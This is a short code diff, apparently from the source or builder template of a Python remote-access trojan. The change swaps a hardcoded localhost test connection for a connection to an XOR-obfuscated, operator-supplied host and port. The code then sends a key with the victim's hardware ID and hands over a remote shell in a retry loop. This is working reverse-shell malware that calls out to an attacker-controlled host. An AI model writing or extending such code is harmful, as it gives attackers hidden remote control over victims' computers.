@@ -914,10 +914,10 @@ def connection():
     while True:
         time.sleep(5)
         try:
-            #port = xor_strings($lport, $portkey).decode('utf8')
-            #host = xor_strings($lhost, $hostkey).decode('utf8')
-            s.connect(('127.0.0.1',int(4444)))
-            s.send('youhacker'.encode()+":".encode()+gethwid().encode())
+            port = xor_strings($lport, $portkey).decode('utf8')
+            host = xor_strings($lhost, $hostkey).decode('utf8')
+            s.connect((host,int(port)))
+            s.send('$key'.encode()+":".encode()+gethwid().encode())
 
             shell()
             s.close()
